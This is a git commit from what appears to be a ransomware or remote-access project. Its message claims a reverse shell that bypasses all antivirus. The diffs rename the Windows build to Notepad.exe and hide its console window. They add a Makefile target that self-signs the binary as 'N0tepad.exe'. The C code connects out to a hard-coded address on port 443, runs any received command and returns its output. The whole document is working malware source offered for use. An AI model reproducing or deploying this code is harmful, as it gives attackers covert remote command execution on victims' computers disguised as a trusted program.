e64a96e67a0c82bbc4277f24392e2cee41e3519e
dkb4rb <jjuannca651@gmail.com>
2023-08-08 04:35:59 -0500

    Ramsom_DK_Ware: #1-Server, 001_Revershell_And_Byppass all AV

--- Makefile
+++ Makefile
@@ -1,4 +1,11 @@
 exploit :
-	i686-w64-mingw32-gcc -o malware.exe main.c -lwsock32 -lwininet
+	i686-w64-mingw32-gcc -o Notepad.exe main.c -lwsock32 -lwininet -s -mwindows -static-libgcc -static-libstdc++ 
+cert:
+	openssl genpkey -algorithm RSA -out Private_Key.key
+	openssl req -new -key Private_Key.key -out Request.csr 
+	openssl x509 -req -in Request.csr -signkey Private_Key.key -out Certificate.crt
+	openssl pkcs12 -export -out Certificate.pfx -inkey Private_Key.key -in Certificate.crt 		
+	../osslsigncode/build/osslsigncode sign -pkcs12 Certificate.pfx -pass "Hacked" -in Notepad.exe -out N0tepad.exe 	
+
 runserver :
 	gcc server.c -o Server
--- man3.c
+++ man3.c
@@ -6,25 +6,13 @@
 
 #define MAX_BUFFER_SIZE 1024
 
-void executeCommand(SOCKET sock, const char* cmd) {
-    char response[MAX_BUFFER_SIZE];
-    memset(response, 0, sizeof(response));
-    
-    FILE* fp = _popen(cmd, "r");
-    if (fp != NULL) {
-        while (fgets(response, sizeof(response), fp) != NULL) {
-            send(sock, response, strlen(response), 0);
-            memset(response, 0, sizeof(response));
-        }
-        _pclose(fp);
-    }
-}
-
 void handleCommands(SOCKET sock) {
     char command[MAX_BUFFER_SIZE];
+    char response[MAX_BUFFER_SIZE];
     
     while (1) {
         memset(command, 0, sizeof(command));
+        memset(response, 0, sizeof(response));
         
         int bytesReceived = recv(sock, command, sizeof(command), 0);
         if (bytesReceived <= 0) {
@@ -33,12 +21,15 @@ void handleCommands(SOCKET sock) {
         
         if (strcmp("quiet", command) == 0) {
             break;
-        }
-	else if(strcmp("dir", command) == 0){
-		executeCommand(sock, command);
-	} 
-	else {
-            executeCommand(sock, command);
+        } else {
+            FILE *fp = _popen(command, "r");
+            if (fp != NULL) {
+                while (fgets(response, sizeof(response), fp) != NULL) {
+                    send(sock, response, strlen(response), 0);
+                    memset(response, 0, sizeof(response));
+                }
+                _pclose(fp);
+            }
         }
     }
 }
@@ -58,10 +49,10 @@ int main() {
     }
 
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(5005);  // Change the port if needed
-    serverAddr.sin_addr.s_addr = inet_addr("192.168.18.228"); // Change this address
+    serverAddr.sin_port = htons(443);  // Cambia el puerto si es necesario
+    serverAddr.sin_addr.s_addr = inet_addr("192.168.18.228"); // Cambia esta dirección
 
-    if (connect(sock, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) != 0) {
+    if (connect(sock, (struct sockaddr *) &serverAddr, sizeof(serverAddr)) != 0) {
         closesocket(sock);
         WSACleanup();
         return 1;
